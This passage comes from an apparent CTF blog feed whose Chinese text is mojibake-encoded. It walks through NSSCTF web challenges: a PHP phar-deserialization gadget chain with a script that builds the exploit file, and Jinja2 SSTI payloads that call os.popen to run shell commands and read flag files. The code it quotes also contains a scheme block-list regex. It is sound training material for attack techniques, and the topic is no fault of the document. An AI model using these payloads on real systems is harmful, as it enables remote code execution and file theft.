class="string">&#x27;æ’ä»¶ä¸Šä¼ å¤±è´¥ï¼Œ é”™è¯¯ç ï¼š&#x27;</span> . <span class="variable">$zipfile</span>[<span class="string">&#x27;error&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">getFileSuffix</span>(<span class="variable">$zipfile</span>[<span class="string">&#x27;name&#x27;</span>]) != <span class="string">&#x27;zip&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">emDirect</span>(<span class="string">&quot;./plugin.php?error_f=1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="title function_ invoke__">emUnZip</span>(<span class="variable">$zipfile</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;../content/plugins/&#x27;</span>, <span class="string">&#x27;plugin&#x27;</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$ret</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="title function_ invoke__">emDirect</span>(<span class="string">&quot;./plugin.php?activate_install=1&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1</span>:</span><br><span class="line">            <span class="title function_ invoke__">emDirect</span>(<span class="string">&quot;./plugin.php?error_e=1&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="title function_ invoke__">emDirect</span>(<span class="string">&quot;./plugin.php?error_b=1&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="title function_ invoke__">emDirect</span>(<span class="string">&quot;./plugin.php?error_c=1&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡ç‚¹åœ¨æ­¤å¤„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ret = emUnZip($zipfile[&#x27;tmp_name&#x27;], &#x27;../content/plugins/&#x27;, &#x27;plugin&#x27;);</span><br></pre></td></tr></table></figure><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216194234363.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VNCTF&#123;8ceee0ba-f6e3-f38f-903c-4f96cab7d6b5&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSS-webåˆ·é¢˜</title>
      <link href="/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/"/>
      <url>/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>NSSCTF web åˆ·é¢˜ï¼Œç£ä¿ƒè‡ªå·±ç”¨çš„ï¼Œå›¾å°±ä¸æ”¾äº†ï¼Œå¥½éº»çƒ¦å˜¤å˜¤å˜¤</p><h2 id="SWPU-2018-SimplePHP"><a href="#SWPU-2018-SimplePHP" class="headerlink" title="[SWPU 2018]SimplePHP"></a>[SWPU 2018]SimplePHP</h2><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129090655640.png" alt="image-20241129090655640" style="zoom: 80%;" /><p>ä¸€çœ¼ä»»æ„æ–‡ä»¶è¯»å–</p><p>è·å–ç›®å½•ä¸‹çš„æ–‡ä»¶</p><p><strong>index.php</strong></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129090754383.png" alt="image-20241129090754383"></p><p><strong>function.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>)) &#123; </span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">upload_file_check</span>()) &#123; </span><br><span class="line">        <span class="title function_ invoke__">upload_file_do</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$extension</span>)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><strong>class.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_get</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><strong>base.php</strong></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129090905238.png" alt="image-20241129090905238"></p><p><strong>upload_file.php</strong></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129091157168.png" alt="image-20241129091157168"></p><p>ç„¶åæˆ‘ä»¬éœ€è¦è¿›è¡Œçš„å°±æ˜¯ä»£ç å®¡è®¡</p><p>ä¸Šä¼ çš„æ–‡ä»¶åç¼€é™å®šä¸ºç™½åå•ï¼Œä¸”ä¼šå¼ºåˆ¶æ”¹æˆ.jpgï¼Œé‚£ä¹ˆæ­£å¸¸çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´å°±ä¸å­˜åœ¨äº†ï¼Œå¾—æƒ³å…¶ä»–åŠæ³•ï¼Œæºç ä¸­å…¶å®ä¹Ÿç»™äº†æç¤ºï¼Œpharååºåˆ—åŒ–ï¼Œç»™äº†æ–‡ä»¶åŒ…å«çš„ç‚¹ï¼Œä¹Ÿç»™äº†æ–‡ä»¶ä¸Šä¼ çš„ç‚¹ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨pharååºåˆ—åŒ–äº†ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥å°±è¦æ‰¾é“¾æ¡äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C1e4r::__destruct() -&gt; Show::__toString() -&gt; Test::__get() -&gt; Test::get() -&gt; Test::file_get()</span><br></pre></td></tr></table></figure><p>é“¾å­æ‹¿æäº†ï¼Œæ„é€ å°±è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">C1e4r</span>();</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$t</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$t</span>-&gt;params[<span class="string">&#x27;source&#x27;</span>]=<span class="string">&#x27;/var/www/html/f1ag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]=<span class="variable">$t</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;str=<span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//åˆ é™¤ä¹‹å‰çš„test.pharæ–‡ä»¶(å¦‚æœæœ‰)</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>(); <span class="comment">//å¼€å§‹ç¼“å†² Phar å†™æ“ä½œ</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>); <span class="comment">//è®¾ç½®stubï¼Œæ·»åŠ gifæ–‡ä»¶å¤´</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>); <span class="comment">//è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$c</span>);  <span class="comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>(); <span class="comment">////åœæ­¢ç¼“å†²å¯¹ Phar å½’æ¡£çš„å†™å…¥è¯·æ±‚ï¼Œå¹¶å°†æ›´æ”¹ä¿å­˜åˆ°ç£ç›˜</span></span><br></pre></td></tr></table></figure><p>ç„¶åå°†pharæ–‡ä»¶åç¼€æ”¹æˆjpgï¼Œä¸Šä¼ ååœ¨uploadç›®å½•ä¸‹è·å–åç§°ç„¶ååœ¨file.phpæ–‡ä»¶ä¸‹è¿›è¡Œpharæ–‡ä»¶åŒ…å«å³å¯è·å–flag</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129094525150.png" alt="image-20241129094525150"></p><h2 id="CISCN-2019åä¸œå—-Double-Secret"><a href="#CISCN-2019åä¸œå—-Double-Secret" class="headerlink" title="[CISCN 2019åä¸œå—]Double Secret"></a>[CISCN 2019åä¸œå—]Double Secret</h2><p>æ‰«ç›®å½•å‘ç°&#x2F;secretç›®å½•</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129152014405.png" alt="image-20241129152014405"></p><p>ä¼ å…¥secretå‚æ•°åä¼šåŠ å¯†åè¿›è¡Œå›æ˜¾ï¼Œ11111å°±æŠ¥é”™äº†ï¼ŒåŒæ—¶å‘ç°æ³„éœ²äº†éƒ¨åˆ†æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(secret==<span class="literal">None</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line">rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="comment">#è§£å¯†</span></span><br><span class="line">deS=rc.do_crypt(secret)</span><br><span class="line">a=render_template_string(safe(deS))</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> a</span><br></pre></td></tr></table></figure><p>ä¸€çœ¼ssti</p><p>RC4åŠ å¯†åç”¨render_template_stringè¿›è¡Œæ¨¡æ¿æ¸²æŸ“ï¼ŒRC4å¯†é’¥ä¸ºHereIsTreasureï¼ŒåŒæ—¶ç”¨safe()å‡½æ•°å¯¹æ¶æ„ä»£ç è¿›è¡Œè¿‡æ»¤</p><p>é‚£æ¥ä¸‹æ¥å°±è¯•ç€ssti</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129153324392.png" alt="image-20241129153324392"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129153330890.png" alt="image-20241129153330890"></p><p>é‚£å°±</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2]&#125;&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±èƒ½è·å¾—objectäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129153602396.png" alt="image-20241129153602396"></p><p>ç„¶åä¸çŸ¥é“æ‰¾å“ªä¸ªç±»äº†ï¼Œç½‘ä¸Šè¯´ç”¨warnings.catch_warningsç±»ç„¶å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat /flag.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘ä¸å¤ªè¡Œå•Šï¼Œä¸çŸ¥é“ä¸ºå•¥ã€‚</p><p>åæ¥ç”¨configç›´æ¥è¯•ï¼Œå±…ç„¶å¯ä»¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129154720280.png" alt="image-20241129154720280"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129154816344.png" alt="image-20241129154816344"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>NSSCTF{2503893c-a2dd-44f5-822d-40536acbabd0}</p><p>åæ¥åˆå›å½’ä¹‹å‰çš„payloadï¼Œç”¨&lt;class â€˜site._Printerâ€™&gt;ç±»é‡Œé¢çš„globalsæœ‰osæ¨¡å—ï¼Œæ˜¯å¯ä»¥ç”¨çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>warnings.catch_warningsç±»æœ‰openæ¨¡å—ï¼Œå¯ä»¥ç›´æ¥æ‰“å¼€æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;open&#x27;](&#x27;/flag.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="TQLCTF-2022-simple-bypass"><a href="#TQLCTF-2022-simple-bypass" class="headerlink" title="[TQLCTF 2022]simple_bypass"></a>[TQLCTF 